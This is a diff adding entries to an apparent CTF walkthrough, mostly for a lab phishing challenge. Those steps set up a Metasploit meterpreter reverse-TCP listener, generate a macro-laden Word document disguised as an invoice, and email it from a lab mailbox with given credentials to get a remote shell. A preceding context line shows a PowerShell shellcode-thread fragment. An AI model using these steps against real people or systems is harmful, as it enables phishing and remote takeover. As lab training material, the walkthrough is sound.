@@ -329,3 +329,47 @@ $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
 ```powershell
 type C:\Users\glitch\Desktop\flag.txt
 ```
+
+## GRC - Day 9: Nine o'clock, make GRC fun, tell no one
+
+Just follow the instructions, you can re-edit your assessments until you get all as "Perfect assessment" before completing each step
+
+## Phishing - Day 10: He had a brain full of macros, and had shells in his soul
+
+**What is the flag value inside the flag.txt file that’s located on the Administrator’s desktop?**
+
+1) On one terminal listen for incoming connections:
+```shell
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ATTACKBOX_IP>
+set LPORT 8888 specifies
+exploit
+```
+
+2) On another terminal create the malicious document:
+```shell
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+use exploit/multi/fileformat/office_word_macro
+set LHOST <ATTACKBOX_IP>
+set LPORT 8888
+exploit
+exit
+
+mv /root/.msf4/local/msf.docm /root/invoice.docm
+```
+
+3) Send the phishing email:
+* Go to http://MAILSERVER_IP
+* Login as **info@socnas.thm**, password **MerryPhishMas!**
+* New email:
+  * Subject: Invoice
+  * Body: Please find attached invoice, best regards! (bla bla bla)
+  * Attach /root/invoice.docm
+
+4) After a few seconds a shell should appear in first terminal:
+```shell
+meterpreter> cat /Users/Administrator/Desktop/flag.txt 
+```
